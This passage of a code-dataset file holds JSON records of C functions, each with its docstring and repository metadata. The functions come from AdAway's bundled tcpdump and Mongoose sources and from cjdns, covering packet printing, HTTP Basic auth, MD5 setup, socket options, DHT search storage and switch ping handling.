(ndo->ndo_vflag)\n\t\t\tND_PRINT((ndo, \"et1 \"));\n\t\tatalk_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_AARP:\n\t\taarp_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_IPX:\n\t\tND_PRINT((ndo, \"(NOV-ETHII) \"));\n\t\tipx_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_ISO:\n\t\tisoclns_print(ndo, p + 1, length - 1, length - 1);\n\t\treturn(1);\n\n\tcase ETHERTYPE_PPPOED:\n\tcase ETHERTYPE_PPPOES:\n\tcase ETHERTYPE_PPPOED2:\n\tcase ETHERTYPE_PPPOES2:\n\t\tpppoe_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_EAPOL:\n\t        eap_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_RRCP:\n\t        rrcp_print(ndo, p - 14 , length + 14);\n\t\treturn (1);\n\n\tcase ETHERTYPE_PPP:\n\t\tif (length) {\n\t\t\tND_PRINT((ndo, \": \"));\n\t\t\tppp_print(ndo, p, length);\n\t\t}\n\t\treturn (1);\n\n\tcase ETHERTYPE_MPCP:\n\t        mpcp_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_SLOW:\n\t        slow_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_CFM:\n\tcase ETHERTYPE_CFM_OLD:\n\t\tcfm_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_LLDP:\n\t\tlldp_print(ndo, p, length);\n\t\treturn (1);\n\n        case ETHERTYPE_LOOPBACK:\n\t\tloopback_print(ndo, p, length);\n                return (1);\n\n\tcase ETHERTYPE_MPLS:\n\tcase ETHERTYPE_MPLS_MULTI:\n\t\tmpls_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_TIPC:\n\t\ttipc_print(ndo, p, length, caplen);\n\t\treturn (1);\n\n\tcase ETHERTYPE_MS_NLB_HB:\n\t\tmsnlb_print(ndo, p);\n\t\treturn (1);\n\n        case ETHERTYPE_GEONET_OLD:\n        case ETHERTYPE_GEONET:\n                geonet_print(ndo, p-14, p, length);\n                return (1);\n\n        case ETHERTYPE_CALM_FAST:\n                calm_fast_print(ndo, p-14, p, length);\n                return (1);\n\n\tcase ETHERTYPE_AOE:\n\t\taoe_print(ndo, p, length);\n\t\treturn (1);\n\n\tcase ETHERTYPE_LAT:\n\tcase ETHERTYPE_SCA:\n\tcase ETHERTYPE_MOPRC:\n\tcase ETHERTYPE_MOPDL:\n\tcase ETHERTYPE_IEEE1905_1:\n\t\t/* default_print for now */\n\tdefault:\n\t\treturn (0);\n\t}\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ether.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * This is the top level routine of the printer.  'bp' points\n * to the calm header of the packet.\n */\n", "func_signal": "void\ncalm_fast_print(netdissect_options *ndo, const u_char *eth, const u_char *bp, u_int length)", "code": "{\n\tint srcNwref = bp[0];\n\tint dstNwref = bp[1];\n\tlength -= 2;\n\tbp += 2;\n\n\tND_PRINT((ndo, \"CALM FAST src:%s; \", etheraddr_string(ndo, eth+6)));\n\tND_PRINT((ndo, \"SrcNwref:%d; \", srcNwref));\n\tND_PRINT((ndo, \"DstNwref:%d; \", dstNwref));\n\n\tif (ndo->ndo_vflag)\n\t\tND_DEFAULTPRINT(bp, length);\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-calm-fast.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "//////////////////////////////////////////   NO TLS\n", "func_signal": "int mg_tls_init(struct mg_connection *c, struct mg_tls_opts *opts)", "code": "{\n  (void) opts;\n  mg_error(c, \"TLS is not enabled\");\n  return 0;\n}", "path": "AdAway/webserver/jni/mongoose/mongoose.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "// Multipart POST example:\n// https://gist.github.com/cpq/b8dd247571e6ee9c54ef7e8dfcfecf48\n", "func_signal": "void mg_http_bauth(struct mg_connection *c, const char *user,\n                   const char *pass)", "code": "{\n  struct mg_str u = mg_str(user), p = mg_str(pass);\n  size_t need = c->send.len + 36 + (u.len + p.len) * 2;\n  if (c->send.size < need) mg_iobuf_resize(&c->send, need);\n  if (c->send.size >= need) {\n    size_t i, n = 0;\n    char *buf = (char *) &c->send.buf[c->send.len + 21];\n    memcpy(&buf[-21], \"Authorization: Basic \", 21);  // DON'T use mg_send!\n    for (i = 0; i < u.len; i++) n = mg_base64_update(u.ptr[i], buf, n);\n    if (p.len > 0) {\n      n = mg_base64_update(':', buf, n);\n      for (i = 0; i < p.len; i++) n = mg_base64_update(p.ptr[i], buf, n);\n    }\n    n = mg_base64_final(buf, n);\n    c->send.len += 21 + n + 2;\n    memcpy(&c->send.buf[c->send.len - 2], \"\\r\\n\", 2);\n  } else {\n    LOG(LL_ERROR, (\"%p %s cannot resize iobuf %d->%d \", c->fd, c->label,\n                   (int) c->send.size, (int) need));\n  }\n}", "path": "AdAway/webserver/jni/mongoose/mongoose.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* make a clean exit on interrupts */\n", "func_signal": "static RETSIGTYPE\ncleanup(int signo _U_)", "code": "{\n#ifdef USE_WIN32_MM_TIMER\n\tif (timer_id)\n\t\ttimeKillEvent(timer_id);\n\ttimer_id = 0;\n#elif defined(HAVE_ALARM)\n\talarm(0);\n#endif\n\n#ifdef HAVE_PCAP_BREAKLOOP\n\t/*\n\t * We have \"pcap_breakloop()\"; use it, so that we do as little\n\t * as possible in the signal handler (it's probably not safe\n\t * to do anything with standard I/O streams in a signal handler -\n\t * the ANSI C standard doesn't say it is).\n\t */\n\tpcap_breakloop(pd);\n#else\n\t/*\n\t * We don't have \"pcap_breakloop()\"; this isn't safe, but\n\t * it's the best we can do.  Print the summary if we're\n\t * not reading from a savefile - i.e., if we're doing a\n\t * live capture - and exit.\n\t */\n\tif (pd != NULL && pcap_file(pd) == NULL) {\n\t\t/*\n\t\t * We got interrupted, so perhaps we didn't\n\t\t * manage to finish a line we were printing.\n\t\t * Print an extra newline, just in case.\n\t\t */\n\t\tputchar('\\n');\n\t\t(void)fflush(stdout);\n\t\tinfo(1);\n\t}\n\texit(0);\n#endif\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * This is the top level routine of the printer.  'p' points\n * to the ether header of the packet, 'h->ts' is the timestamp,\n * 'h->len' is the length of the packet off the wire, and 'h->caplen'\n * is the number of bytes actually captured.\n *\n * This is for DLT_NETANALYZER, which has a 4-byte pseudo-header\n * before the Ethernet header.\n */\n", "func_signal": "u_int\nnetanalyzer_if_print(netdissect_options *ndo, const struct pcap_pkthdr *h,\n                     const u_char *p)", "code": "{\n\t/*\n\t * Fail if we don't have enough data for the Hilscher pseudo-header.\n\t */\n\tif (h->len < 4 || h->caplen < 4) {\n\t\tND_PRINT((ndo, \"[|netanalyzer]\"));\n\t\treturn (h->caplen);\n\t}\n\n\t/* Skip the pseudo-header. */\n\tether_print(ndo, p + 4, h->len - 4, h->caplen - 4, NULL, NULL);\n\n\treturn (4 + ETHER_HDRLEN);\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ether.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * This is the top level routine of the printer.  'p' points\n * to the ether header of the packet, 'h->ts' is the timestamp,\n * 'h->len' is the length of the packet off the wire, and 'h->caplen'\n * is the number of bytes actually captured.\n *\n * This is for DLT_NETANALYZER_TRANSPARENT, which has a 4-byte\n * pseudo-header, a 7-byte Ethernet preamble, and a 1-byte Ethernet SOF\n * before the Ethernet header.\n */\n", "func_signal": "u_int\nnetanalyzer_transparent_if_print(netdissect_options *ndo,\n                                 const struct pcap_pkthdr *h,\n                                 const u_char *p)", "code": "{\n\t/*\n\t * Fail if we don't have enough data for the Hilscher pseudo-header,\n\t * preamble, and SOF.\n\t */\n\tif (h->len < 12 || h->caplen < 12) {\n\t\tND_PRINT((ndo, \"[|netanalyzer-transparent]\"));\n\t\treturn (h->caplen);\n\t}\n\n\t/* Skip the pseudo-header, preamble, and SOF. */\n\tether_print(ndo, p + 12, h->len - 12, h->caplen - 12, NULL, NULL);\n\n\treturn (12 + ETHER_HDRLEN);\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ether.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* VARARGS */\n", "func_signal": "static void\nndo_error(netdissect_options *ndo _U_, const char *fmt, ...)", "code": "{\n\tva_list ap;\n\n\t(void)fprintf(stderr, \"%s: \", program_name);\n\tva_start(ap, fmt);\n\t(void)vfprintf(stderr, fmt, ap);\n\tva_end(ap);\n\tif (*fmt) {\n\t\tfmt += strlen(fmt);\n\t\tif (fmt[-1] != '\\n')\n\t\t\t(void)fputc('\\n', stderr);\n\t}\n\texit(1);\n\t/* NOTREACHED */\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* HAVE_FORK && HAVE_VFORK */\n", "func_signal": "static void\ncompress_savefile(const char *filename)", "code": "{\n\tfprintf(stderr,\n\t\t\"compress_savefile failed. Functionality not implemented under your system\\n\");\n}", "path": "AdAway/tcpdump/jni/tcpdump/tcpdump.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * This is the top level routine of the printer.  'p' points\n * to the ether header of the packet, 'h->ts' is the timestamp,\n * 'h->len' is the length of the packet off the wire, and 'h->caplen'\n * is the number of bytes actually captured.\n */\n", "func_signal": "u_int\nether_if_print(netdissect_options *ndo, const struct pcap_pkthdr *h,\n               const u_char *p)", "code": "{\n\tether_print(ndo, p, h->len, h->caplen, NULL, NULL);\n\n\treturn (ETHER_HDRLEN);\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ether.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * This is the top level routine of the printer.  'p' points\n * to the ether header of the packet, 'h->ts' is the timestamp,\n * 'h->len' is the length of the packet off the wire, and 'h->caplen'\n * is the number of bytes actually captured.\n */\n", "func_signal": "u_int\nap1394_if_print(netdissect_options *ndo, const struct pcap_pkthdr *h, const u_char *p)", "code": "{\n\tu_int length = h->len;\n\tu_int caplen = h->caplen;\n\tstruct firewire_header *fp;\n\tu_short ether_type;\n\n\tif (caplen < FIREWIRE_HDRLEN) {\n\t\tND_PRINT((ndo, \"[|ap1394]\"));\n\t\treturn FIREWIRE_HDRLEN;\n\t}\n\n\tif (ndo->ndo_eflag)\n\t\tap1394_hdr_print(ndo, p, length);\n\n\tlength -= FIREWIRE_HDRLEN;\n\tcaplen -= FIREWIRE_HDRLEN;\n\tfp = (struct firewire_header *)p;\n\tp += FIREWIRE_HDRLEN;\n\n\tether_type = EXTRACT_16BITS(&fp->firewire_type);\n\tif (ethertype_print(ndo, ether_type, p, length, caplen) == 0) {\n\t\t/* ether_type not known, print raw packet */\n\t\tif (!ndo->ndo_eflag)\n\t\t\tap1394_hdr_print(ndo, (u_char *)fp, length + FIREWIRE_HDRLEN);\n\n\t\tif (!ndo->ndo_suppress_default_print)\n\t\t\tND_DEFAULTPRINT(p, caplen);\n\t}\n\n\treturn FIREWIRE_HDRLEN;\n}", "path": "AdAway/tcpdump/jni/tcpdump/print-ap1394.c", "commit_date": "2018-05-10 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "// Try to avoid dirent API\n", "func_signal": "static int mg_is_dir(const char *path)", "code": "{\n#if MG_ARCH == MG_ARCH_FREERTOS\n  struct FF_STAT st;\n  return (ff_stat(path, &st) == 0) && (st.st_mode & FF_IFDIR);\n#else\n  struct stat st;\n  return (stat(path, &st) == 0) && (st.st_mode & S_IFDIR);\n#endif\n}", "path": "AdAway/webserver/jni/mongoose/mongoose.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/*\n * Start MD5 accumulation.  Set bit count to 0 and buffer to mysterious\n * initialization constants.\n */\n", "func_signal": "void mg_md5_init(mg_md5_ctx *ctx)", "code": "{\n  ctx->buf[0] = 0x67452301;\n  ctx->buf[1] = 0xefcdab89;\n  ctx->buf[2] = 0x98badcfe;\n  ctx->buf[3] = 0x10325476;\n\n  ctx->bits[0] = 0;\n  ctx->bits[1] = 0;\n}", "path": "AdAway/webserver/jni/mongoose/mongoose.c", "commit_date": "2020-12-23 00:00:00", "repo_name": "AdAway/AdAway", "stars": 6373, "license": "gpl-3.0", "language": "c", "size": 40779}
{"docstring": "/* sysconf */\n", "func_signal": "int uv__platform_loop_init(uv_loop_t* loop, int default_loop)", "code": "{\n  loop->cf_state = NULL;\n\n  if (uv__kqueue_init(loop))\n    return -errno;\n\n  return 0;\n}", "path": "cjdns/node_build/dependencies/libuv/src/unix/darwin.c", "commit_date": "2014-02-23 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/** See: SearchStore.h */\n", "func_signal": "int SearchStore_addNodeToSearch(struct Address* addr, struct SearchStore_Search* search)", "code": "{\n    struct SearchStore_Search_pvt* pvtSearch = (struct SearchStore_Search_pvt*) search;\n    for (int i = 0; i < SearchStore_SEARCH_NODES; i++) {\n        if (!Bits_memcmp(addr->key, pvtSearch->nodesAsked[i].address.key, 32)) {\n            // Already bugged this node, skip.\n            return -1;\n        } else if (i == pvtSearch->nodesAskedIndex\n            && Bits_isZero(pvtSearch->nodesAsked[i].address.key, 32))\n        {\n            // short circuit a common case where the nodesAskedIndex has not yet wrapped.\n            break;\n        }\n    }\n\n    const uint16_t index =\n        (pvtSearch->searchStackSize < SearchStore_SEARCH_NODES)\n            // add it to the end...\n            ? pvtSearch->searchStackSize++\n\n            // nodes are added worst-to-best so replace the last entry.\n            : pvtSearch->searchStackSize - 1;\n\n    Bits_memcpy(&pvtSearch->searchStack[index], addr, Address_SIZE);\n\n    return 0;\n}", "path": "cjdns/dht/dhtcore/SearchStore.c", "commit_date": "2017-01-13 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/** Asynchronous allocator freeing. */\n", "func_signal": "static void onClose(uv_handle_t* handle)", "code": "{\n    struct PipeServer_pvt* psp = Identity_check((struct PipeServer_pvt*)handle->data);\n    handle->data = NULL;\n    if (psp->closeHandlesOnFree && !psp->server.data) {\n        Allocator_onFreeComplete((struct Allocator_OnFreeJob*) psp->closeHandlesOnFree);\n    }\n}", "path": "cjdns/util/events/libuv/PipeServer.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/** See: SearchStore.h */\n", "func_signal": "struct SearchStore_Node* SearchStore_getNextNode(struct SearchStore_Search* search)", "code": "{\n    struct SearchStore_Search_pvt* pvtSearch = (struct SearchStore_Search_pvt*) search;\n    if (!pvtSearch->searchStackSize) {\n        return NULL;\n    }\n\n    struct SearchStore_Node* nn = &pvtSearch->nodesAsked[pvtSearch->nodesAskedIndex];\n    Bits_memcpy(&nn->address,\n                     &pvtSearch->searchStack[--pvtSearch->searchStackSize],\n                     sizeof(struct Address));\n    nn->search = search;\n\n    pvtSearch->nodesAskedIndex = (pvtSearch->nodesAskedIndex + 1) % SearchStore_SEARCH_NODES;\n    return nn;\n}", "path": "cjdns/dht/dhtcore/SearchStore.c", "commit_date": "2017-01-13 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "// incoming message from network, pointing to the beginning of the switch header.\n", "func_signal": "static Iface_DEFUN messageFromControlHandler(struct Message* msg, struct Iface* iface)", "code": "{\n    struct SwitchPinger_pvt* ctx = Identity_check((struct SwitchPinger_pvt*) iface);\n    struct RouteHeader rh;\n    Er_assert(Message_epop(msg, &rh, RouteHeader_SIZE));\n    ctx->incomingLabel = Endian_bigEndianToHost64(rh.sh.label_be);\n    ctx->incomingVersion = 0;\n    Bits_memset(&ctx->incomingSnodeAddr, 0, sizeof ctx->incomingSnodeAddr);\n    Bits_memset(ctx->incomingKey, 0, sizeof ctx->incomingKey);\n    ctx->incomingSnodeKbps = 0;\n    ctx->rpath = 0;\n\n    struct Control* ctrl = (struct Control*) msg->bytes;\n    if (ctrl->header.type_be == Control_PONG_be) {\n        Er_assert(Message_eshift(msg, -Control_Header_SIZE));\n        ctx->error = Error_NONE;\n        if (msg->length >= Control_Pong_MIN_SIZE) {\n            struct Control_Ping* pongHeader = (struct Control_Ping*) msg->bytes;\n            ctx->incomingVersion = Endian_bigEndianToHost32(pongHeader->version_be);\n            if (pongHeader->magic != Control_Pong_MAGIC) {\n                Log_debug(ctx->logger, \"dropped invalid switch pong\");\n                return Error(INVALID);\n            }\n            Er_assert(Message_eshift(msg, -Control_Pong_HEADER_SIZE));\n        } else {\n            Log_debug(ctx->logger, \"got runt pong message, length: [%d]\", msg->length);\n            return Error(RUNT);\n        }\n\n    } else if (ctrl->header.type_be == Control_KEYPONG_be) {\n        Er_assert(Message_eshift(msg, -Control_Header_SIZE));\n        ctx->error = Error_NONE;\n        if (msg->length >= Control_KeyPong_HEADER_SIZE && msg->length <= Control_KeyPong_MAX_SIZE) {\n            struct Control_KeyPing* pongHeader = (struct Control_KeyPing*) msg->bytes;\n            ctx->incomingVersion = Endian_bigEndianToHost32(pongHeader->version_be);\n            if (pongHeader->magic != Control_KeyPong_MAGIC) {\n                Log_debug(ctx->logger, \"dropped invalid switch key-pong\");\n                return Error(INVALID);\n            }\n            Bits_memcpy(ctx->incomingKey, pongHeader->key, 32);\n            Er_assert(Message_eshift(msg, -Control_KeyPong_HEADER_SIZE));\n        } else if (msg->length > Control_KeyPong_MAX_SIZE) {\n            Log_debug(ctx->logger, \"got overlong key-pong message, length: [%d]\", msg->length);\n            return Error(INVALID);\n        } else {\n            Log_debug(ctx->logger, \"got runt key-pong message, length: [%d]\", msg->length);\n            return Error(RUNT);\n        }\n\n    } else if (ctrl->header.type_be == Control_GETSNODE_REPLY_be) {\n        Er_assert(Message_eshift(msg, -Control_Header_SIZE));\n        ctx->error = Error_NONE;\n        if (msg->length < Control_GetSnode_HEADER_SIZE) {\n            Log_debug(ctx->logger, \"got runt GetSnode message, length: [%d]\", msg->length);\n            return Error(RUNT);\n        }\n        struct Control_GetSnode* hdr = (struct Control_GetSnode*) msg->bytes;\n        if (hdr->magic != Control_GETSNODE_REPLY_MAGIC) {\n            Log_debug(ctx->logger, \"dropped invalid GetSnode\");\n            return Error(INVALID);\n        }\n        if (Bits_isZero(hdr->snodeKey, 32)) {\n            Log_debug(ctx->logger, \"Peer doesn't have an snode\");\n            return Error(NONE);\n        }\n        if (!AddressCalc_addressForPublicKey(ctx->incomingSnodeAddr.ip6.bytes, hdr->snodeKey)) {\n            Log_debug(ctx->logger, \"dropped invalid GetSnode key\");\n            return Error(INVALID);\n        }\n        ctx->incomingVersion = Endian_hostToBigEndian32(hdr->version_be);\n        Bits_memcpy(ctx->incomingSnodeAddr.key, hdr->snodeKey, 32);\n        uint64_t pathToSnode_be;\n        Bits_memcpy(&pathToSnode_be, hdr->pathToSnode_be, 8);\n        ctx->incomingSnodeAddr.path = Endian_bigEndianToHost64(pathToSnode_be);\n        ctx->incomingSnodeAddr.protocolVersion = Endian_bigEndianToHost32(hdr->snodeVersion_be);\n        ctx->incomingSnodeKbps = Endian_bigEndianToHost32(hdr->kbps_be);\n        Er_assert(Message_eshift(msg, -Control_GetSnode_HEADER_SIZE));\n\n    } else if (ctrl->header.type_be == Control_RPATH_REPLY_be) {\n        Er_assert(Message_eshift(msg, -Control_Header_SIZE));\n        ctx->error = Error_NONE;\n        if (msg->length < Control_RPath_HEADER_SIZE) {\n            Log_debug(ctx->logger, \"got runt RPath message, length: [%d]\", msg->length);\n            return Error(RUNT);\n        }\n        struct Control_RPath* hdr = (struct Control_RPath*) msg->bytes;\n        if (hdr->magic != Control_RPATH_REPLY_MAGIC) {\n            Log_debug(ctx->logger, \"dropped invalid RPATH (bad magic)\");\n            return Error(INVALID);\n        }\n        ctx->incomingVersion = Endian_hostToBigEndian32(hdr->version_be);\n        uint64_t rpath_be;\n        Bits_memcpy(&rpath_be, hdr->rpath_be, 8);\n        ctx->rpath = Endian_bigEndianToHost64(rpath_be);\n        Er_assert(Message_eshift(msg, -Control_RPath_HEADER_SIZE));\n\n    } else if (ctrl->header.type_be == Control_ERROR_be) {\n        Er_assert(Message_eshift(msg, -Control_Header_SIZE));\n        Assert_true((uint8_t*)&ctrl->content.error.errorType_be == msg->bytes);\n        if (msg->length < (Control_Error_HEADER_SIZE + SwitchHeader_SIZE + Control_Header_SIZE)) {\n            Log_debug(ctx->logger, \"runt error packet\");\n            return Error(RUNT);\n        }\n\n        ctx->error = Er_assert(Message_epop32be(msg));\n        Er_assert(Message_epush32be(msg, 0));\n\n        Er_assert(Message_eshift(msg, -(Control_Error_HEADER_SIZE + SwitchHeader_SIZE)));\n\n        struct Control* origCtrl = (struct Control*) msg->bytes;\n\n        Log_debug(ctx->logger, \"error [%s] was caused by our [%s]\",\n                  Error_strerror(ctx->error),\n                  Control_typeString(origCtrl->header.type_be));\n\n        int shift;\n        if (origCtrl->header.type_be == Control_PING_be) {\n            shift = -(Control_Header_SIZE + Control_Ping_HEADER_SIZE);\n        } else if (origCtrl->header.type_be == Control_KEYPING_be) {\n            shift = -(Control_Header_SIZE + Control_KeyPing_HEADER_SIZE);\n        } else {\n            Assert_failure(\"problem in Ducttape.c\");\n        }\n        if (msg->length < -shift) {\n            Log_debug(ctx->logger, \"runt error packet\");\n        }\n        Er_assert(Message_eshift(msg, shift));\n\n    } else {\n        // If it gets here then Ducttape.c is failing.\n        Assert_true(false);\n    }\n\n    String* msgStr = &(String) { .bytes = (char*) msg->bytes, .len = msg->length };\n    Pinger_pongReceived(msgStr, ctx->pinger);\n    Bits_memset(ctx->incomingKey, 0, 32);\n    return Error(NONE);\n}", "path": "cjdns/net/SwitchPinger.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/** See: SearchStore.h */\n", "func_signal": "struct SearchStore* SearchStore_new(struct Allocator* allocator, struct Log* logger)", "code": "{\n    return Allocator_clone(allocator, (&(struct SearchStore) {\n        .allocator = allocator,\n        .logger = logger\n    }));\n}", "path": "cjdns/dht/dhtcore/SearchStore.c", "commit_date": "2017-01-13 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/* On the BSDs, SO_REUSEPORT implies SO_REUSEADDR but with some additional\n * refinements for programs that use multicast.\n *\n * Linux as of 3.9 has a SO_REUSEPORT socket option but with semantics that\n * are different from the BSDs: it _shares_ the port rather than steal it\n * from the current listener.  While useful, it's not something we can emulate\n * on other platforms so we don't enable it.\n */\n", "func_signal": "static int uv__set_reuse(int fd)", "code": "{\n  int yes;\n\n#if defined(SO_REUSEPORT) && !defined(__linux__)\n  yes = 1;\n  if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &yes, sizeof(yes)))\n    return -errno;\n#else\n  yes = 1;\n  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)))\n    return -errno;\n#endif\n\n  return 0;\n}", "path": "cjdns/node_build/dependencies/libuv/src/unix/udp.c", "commit_date": "2014-02-23 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
{"docstring": "/*\nPreconditions:\n  |h| bounded by 1.1*2^26,1.1*2^25,1.1*2^26,1.1*2^25,etc.\n\nWrite p=2^255-19; q=floor(h/p).\nBasic claim: q = floor(2^(-255)(h + 19 2^(-25)h9 + 2^(-1))).\n\nProof:\n  Have |h|<=p so |q|<=1 so |19^2 2^(-255) q|<1/4.\n  Also have |h-2^230 h9|<2^231 so |19 2^(-255)(h-2^230 h9)|<1/4.\n\n  Write y=2^(-1)-19^2 2^(-255)q-19 2^(-255)(h-2^230 h9).\n  Then 0<y<1.\n\n  Write r=h-pq.\n  Have 0<=r<=p-1=2^255-20.\n  Thus 0<=r+19(2^-255)r<r+19(2^-255)2^255<=2^255-1.\n\n  Write x=r+19(2^-255)r+y.\n  Then 0<x<2^255 so floor(2^(-255)x) = 0 so floor(q+2^(-255)x) = q.\n\n  Have q+2^(-255)x = 2^(-255)(h + 19 2^(-25) h9 + 2^(-1))\n  so floor(2^(-255)(h + 19 2^(-25) h9 + 2^(-1))) = q.\n*/\n", "func_signal": "void fe_tobytes(unsigned char *s,const fe h)", "code": "{\n  crypto_int32 h0 = h[0];\n  crypto_int32 h1 = h[1];\n  crypto_int32 h2 = h[2];\n  crypto_int32 h3 = h[3];\n  crypto_int32 h4 = h[4];\n  crypto_int32 h5 = h[5];\n  crypto_int32 h6 = h[6];\n  crypto_int32 h7 = h[7];\n  crypto_int32 h8 = h[8];\n  crypto_int32 h9 = h[9];\n  crypto_int32 q;\n  crypto_int32 carry0;\n  crypto_int32 carry1;\n  crypto_int32 carry2;\n  crypto_int32 carry3;\n  crypto_int32 carry4;\n  crypto_int32 carry5;\n  crypto_int32 carry6;\n  crypto_int32 carry7;\n  crypto_int32 carry8;\n  crypto_int32 carry9;\n\n  q = (19 * h9 + (((crypto_int32) 1) << 24)) >> 25;\n  q = (h0 + q) >> 26;\n  q = (h1 + q) >> 25;\n  q = (h2 + q) >> 26;\n  q = (h3 + q) >> 25;\n  q = (h4 + q) >> 26;\n  q = (h5 + q) >> 25;\n  q = (h6 + q) >> 26;\n  q = (h7 + q) >> 25;\n  q = (h8 + q) >> 26;\n  q = (h9 + q) >> 25;\n\n  /* Goal: Output h-(2^255-19)q, which is between 0 and 2^255-20. */\n  h0 += 19 * q;\n  /* Goal: Output h-2^255 q, which is between 0 and 2^255-20. */\n\n  carry0 = h0 >> 26; h1 += carry0; h0 -= carry0 << 26;\n  carry1 = h1 >> 25; h2 += carry1; h1 -= carry1 << 25;\n  carry2 = h2 >> 26; h3 += carry2; h2 -= carry2 << 26;\n  carry3 = h3 >> 25; h4 += carry3; h3 -= carry3 << 25;\n  carry4 = h4 >> 26; h5 += carry4; h4 -= carry4 << 26;\n  carry5 = h5 >> 25; h6 += carry5; h5 -= carry5 << 25;\n  carry6 = h6 >> 26; h7 += carry6; h6 -= carry6 << 26;\n  carry7 = h7 >> 25; h8 += carry7; h7 -= carry7 << 25;\n  carry8 = h8 >> 26; h9 += carry8; h8 -= carry8 << 26;\n  carry9 = h9 >> 25;               h9 -= carry9 << 25;\n                  /* h10 = carry9 */\n\n  /*\n  Goal: Output h0+...+2^255 h10-2^255 q, which is between 0 and 2^255-20.\n  Have h0+...+2^230 h9 between 0 and 2^255-1;\n  evidently 2^255 h10-2^255 q = 0.\n  Goal: Output h0+...+2^230 h9.\n  */\n\n  s[0] = h0 >> 0;\n  s[1] = h0 >> 8;\n  s[2] = h0 >> 16;\n  s[3] = (h0 >> 24) | (h1 << 2);\n  s[4] = h1 >> 6;\n  s[5] = h1 >> 14;\n  s[6] = (h1 >> 22) | (h2 << 3);\n  s[7] = h2 >> 5;\n  s[8] = h2 >> 13;\n  s[9] = (h2 >> 21) | (h3 << 5);\n  s[10] = h3 >> 3;\n  s[11] = h3 >> 11;\n  s[12] = (h3 >> 19) | (h4 << 6);\n  s[13] = h4 >> 2;\n  s[14] = h4 >> 10;\n  s[15] = h4 >> 18;\n  s[16] = h5 >> 0;\n  s[17] = h5 >> 8;\n  s[18] = h5 >> 16;\n  s[19] = (h5 >> 24) | (h6 << 1);\n  s[20] = h6 >> 7;\n  s[21] = h6 >> 15;\n  s[22] = (h6 >> 23) | (h7 << 3);\n  s[23] = h7 >> 5;\n  s[24] = h7 >> 13;\n  s[25] = (h7 >> 21) | (h8 << 4);\n  s[26] = h8 >> 4;\n  s[27] = h8 >> 12;\n  s[28] = (h8 >> 20) | (h9 << 6);\n  s[29] = h9 >> 2;\n  s[30] = h9 >> 10;\n  s[31] = h9 >> 18;\n}", "path": "cjdns/crypto/sign/fe_tobytes.c", "commit_date": "2020-08-02 00:00:00", "repo_name": "cjdelisle/cjdns", "stars": 5122, "license": "gpl-3.0", "language": "c", "size": 25308}
